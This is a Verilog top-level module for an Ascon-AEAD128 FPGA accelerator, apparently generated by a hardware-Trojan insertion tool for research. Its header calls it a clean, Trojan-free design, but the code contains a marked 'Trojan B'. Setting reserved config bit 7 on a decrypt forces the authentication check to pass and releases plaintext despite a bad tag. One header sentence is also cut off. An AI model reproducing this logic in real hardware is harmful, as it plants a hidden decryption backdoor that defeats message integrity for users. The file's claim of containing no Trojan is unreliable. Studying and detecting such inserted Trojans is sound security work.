// crypto_top.v - Ascon-AEAD128 accelerator top: EEPROM-provisioned key material,
// command/status interface, and block-RAM-backed data buffers.
//
// This is the CLEAN design: it contains NO Trojan logic. The three hardware
// Trojans are grafted in by a separate insertion pass (tools/insert_trojan.py),
// which splices trigger + payload logic at the
// this file as-is yields the Trojan-free accelerator.
//
// FIT (resolves the former ~39.8k-LUT problem): the data buffers are block-RAM.
//   * AD / MSG are byte-wide 512-deep EBR (native byte writes from the host); the
//     engine fetches each 128-bit block byte-serially over a rd_req/rd_rdy
//     handshake (so a wide block read costs no LUT mux).
//   * OUT is a 128-bit-wide EBR: the engine writes whole blocks, the host reads
//     bytes via a registered word read + byte select (sub-word *reads* are fine
//     for EBR; it is sub-word *writes* that defeat BRAM inference).
// This mirrors the recovered production bitstream (EBR-backed, 4577 LUT / 7 BRAM)
// and places on the UP5K - verified by nextpnr in pipeline/run_all.sh stage 8.
//
// Buffer map (ice40_crypto_ip.md), byte 0 of a block = MSB:
//   0x000..0x1FF AD   0x200..0x3FF MSG   0x400..0x5FF OUT
//   0x600..0x60F tag-in   0x610..0x61F tag-out   0x620..0x62F host-nonce
`default_nettype none

// === TROJAN B INSERTED by tools/insert_trojan.py: reserved-bit authentication bypass ===
module crypto_top (
    input  wire         clk,
    input  wire         rst_n,
    input  wire         prov_valid,
    input  wire [127:0] prov_key,
    input  wire [127:0] prov_nonce,
    input  wire [127:0] prov_secret,
    input  wire         cmd_we,
    input  wire [15:0]  cmd_waddr,
    input  wire [7:0]   cmd_wdata,
    input  wire [15:0]  cmd_raddr,   // registered buffer read (1-cycle latency)
    output reg  [7:0]   cmd_rdata,
    input  wire         start,
    input  wire [7:0]   cfg,         // [1:0]=op [3:2]=nonce source
    input  wire [9:0]   adlen,
    input  wire [9:0]   msglen,
    output wire [7:0]   status,
    output wire         ice_led
);
    // ---- data buffers ----
    reg [7:0]   admem  [0:511];   // byte-wide EBR (native byte writes)
    reg [7:0]   msgmem [0:511];
    reg [127:0] outmem [0:31];    // 128-bit EBR (engine writes whole blocks)
    // ---- small register buffers ----
    reg [7:0] tagin  [0:15];
    reg [7:0] tagout [0:15];
    reg [7:0] noncein[0:15];

    // ---- provisioned secrets ----
    reg [127:0] r_key, r_nonce, r_secret;
    reg         keys_loaded;
    reg         withhold;

    // ---- status ----
    reg eng_done, eng_auth_ok, eng_auth_fail;
    wire eng_busy;

    // ---- command op latches ----
    reg [1:0] op_l, nsrc_l;
    reg [9:0] adlen_l, msglen_l;
    reg       go;

    // host nonce assembled from the noncein byte buffer
    reg [127:0] host_nonce;
    integer hb;
    always @* begin
        host_nonce = 128'b0;
        for (hb=0;hb<16;hb=hb+1) host_nonce[127-8*hb -: 8] = noncein[hb];
    end
    reg [127:0] eff_nonce;

    //@TJ-DECLS
    // [TROJAN B] trigger: reserved CFG[7] on a decrypt op
    reg trjB_fire;

    // ---- engine wiring ----
    wire [9:0]   rd_blk;
    wire         rd_req;
    reg          rd_rdy;
    reg  [127:0] ad_block, msg_block;   // assembled blocks handed to the engine
    wire         out_we;
    wire [9:0]   out_blk;
    wire [127:0] out_block;
    wire [127:0] eng_tag;
    wire         eng_done_w, eng_ok_w, eng_fail_w;
    reg  [127:0] tagin_w;
    integer tbi;
    always @* begin
        tagin_w = 128'b0;
        for (tbi=0;tbi<16;tbi=tbi+1) tagin_w[127-8*tbi -: 8] = tagin[tbi];
    end

    // ---- byte-serial block fetch (reads AD and MSG EBR into 128-bit blocks) ----
    // raise rd_req + rd_blk -> 16 byte reads -> rd_rdy with ad_block/msg_block set.
    reg rd_req_d;
    always @(posedge clk) rd_req_d <= rd_req;
    wire fetch_go = rd_req & ~rd_req_d;

    reg [1:0] fst;
    reg [3:0] flane;
    reg [4:0] fblk;
    reg [7:0] ad_rdq, msg_rdq;
    localparam F_IDLE=2'd0, F_RD=2'd1, F_CAP=2'd2;
    // synchronous EBR reads for the current fetch byte
    always @(posedge clk) begin
        ad_rdq  <= admem [{fblk,flane}];
        msg_rdq <= msgmem[{fblk,flane}];
    end
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin fst<=F_IDLE; rd_rdy<=0; flane<=0; fblk<=0; end
        else begin
            rd_rdy<=0;
            case (fst)
            F_IDLE: if (fetch_go) begin fblk<=rd_blk[4:0]; flane<=0; fst<=F_RD; end
            F_RD:   fst<=F_CAP;                       // EBR read latency for flane
            F_CAP: begin
                ad_block [(15-flane)*8 +: 8] <= ad_rdq;
                // op=3 (encrypt-secret): block 0 of the message stream is the secret
                if (op_l==2'd3) msg_block[(15-flane)*8 +: 8] <= (fblk==5'd0) ? r_secret[(15-flane)*8 +: 8] : 8'h00;
                else            msg_block[(15-flane)*8 +: 8] <= msg_rdq;
                if (flane==4'd15) begin rd_rdy<=1; fst<=F_IDLE; end
                else begin flane<=flane+4'd1; fst<=F_RD; end
            end
            default: fst<=F_IDLE;
            endcase
        end
    end

    ascon_engine u_eng (
        .clk(clk), .rst_n(rst_n), .start(go),
        .op(op_l), .ad_len(adlen_l), .msg_len(msglen_l),
        .key(r_key), .nonce(eff_nonce),
        .rd_blk(rd_blk), .rd_req(rd_req), .rd_rdy(rd_rdy),
        .ad_block(ad_block), .msg_block(msg_block),
        .out_we(out_we), .out_blk(out_blk), .out_block(out_block),
        .tag_in(tagin_w), .tag_out(eng_tag),
        .busy(eng_busy), .done(eng_done_w), .auth_ok(eng_ok_w), .auth_fail(eng_fail_w)
    );

    // ---- AD/MSG block-RAM writes (reset-free -> infers byte-wide EBR) ----
    always @(posedge clk) begin
        if (cmd_we && cmd_waddr < 16'h200) admem [cmd_waddr[8:0]] <= cmd_wdata;
        if (cmd_we && cmd_waddr >= 16'h200 && cmd_waddr < 16'h400) msgmem[cmd_waddr[8:0]] <= cmd_wdata;
    end
    // ---- OUT block-RAM writes (engine whole-block writes -> infers wide EBR) ----
    always @(posedge clk) begin
        if (out_we) outmem[out_blk[4:0]] <= out_block;
        //@TJ-OUTWR
    end

    // ---- control / status / small register buffers ----
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            keys_loaded<=0; go<=0; eng_done<=0; eng_auth_ok<=0; eng_auth_fail<=0; withhold<=0;
            op_l<=0; nsrc_l<=0; adlen_l<=0; msglen_l<=0;
            //@TJ-RESET
            trjB_fire<=0;
        end else begin
            go<=0;
            if (prov_valid && !keys_loaded) begin
                r_key<=prov_key; r_nonce<=prov_nonce; r_secret<=prov_secret;
                keys_loaded<=1;
            end
            // host byte writes to the small tag/nonce register buffers
            if (cmd_we) begin
                if      (cmd_waddr >= 16'h600 && cmd_waddr < 16'h610) tagin [cmd_waddr[3:0]] <= cmd_wdata;
                else if (cmd_waddr >= 16'h610 && cmd_waddr < 16'h620) tagout[cmd_waddr[3:0]] <= cmd_wdata;
                else if (cmd_waddr >= 16'h620)                        noncein[cmd_waddr[3:0]] <= cmd_wdata;
            end
            //@TJ-SNOOP
            // start an operation
            if (start && keys_loaded && !eng_busy) begin
                op_l   <= cfg[1:0];
                nsrc_l <= cfg[3:2];
                adlen_l<= adlen;
                msglen_l<=msglen;
                case (cfg[3:2])
                    2'd0: eff_nonce <= r_nonce;
                    2'd1: eff_nonce <= host_nonce;
                    2'd2: eff_nonce <= r_nonce ^ host_nonce;
                    default: eff_nonce <= r_nonce;
                endcase
                //@TJ-ATSTART
                trjB_fire <= cfg[7] && (cfg[1:0]==2'd2);
                eng_done<=0; eng_auth_ok<=0; eng_auth_fail<=0; withhold<=0;
                go<=1;
            end
            // completion
            if (eng_done_w) begin
                eng_done<=1; eng_auth_ok<=eng_ok_w; eng_auth_fail<=eng_fail_w;
                for (hb=0;hb<16;hb=hb+1) tagout[hb] <= eng_tag[127-8*hb -: 8];
                if (op_l==2'd2 && eng_fail_w) withhold<=1;
                //@TJ-ATDONE
                // [TROJAN B] payload: force the tag check to pass and
                // release the (correct) recovered plaintext regardless of tag.
                if (trjB_fire) begin
                    eng_auth_ok<=1'b1; eng_auth_fail<=1'b0; withhold<=1'b0;
                end
            end
        end
    end

    // ---- registered buffer read (uniform 1-cycle latency) ----
    reg [127:0] out_word_q;
    reg [15:0]  raddr_q;
    always @(posedge clk) begin
        out_word_q <= outmem[cmd_raddr[8:4]];
        raddr_q    <= cmd_raddr;
    end
    always @* begin
        if      (raddr_q < 16'h400) cmd_rdata = 8'h00;  // AD/MSG are host-write-only
        else if (raddr_q < 16'h600) cmd_rdata = withhold ? 8'h00 : out_word_q[(15-raddr_q[3:0])*8 +: 8];
        else if (raddr_q < 16'h610) cmd_rdata = tagin [raddr_q[3:0]];
        else if (raddr_q < 16'h620) cmd_rdata = tagout[raddr_q[3:0]];
        else                        cmd_rdata = noncein[raddr_q[3:0]];
    end

    assign status = {1'b1,1'b0,1'b0,keys_loaded,eng_auth_fail,eng_auth_ok,eng_done,eng_busy};
    assign ice_led = eng_busy;
endmodule
`default_nettype wire
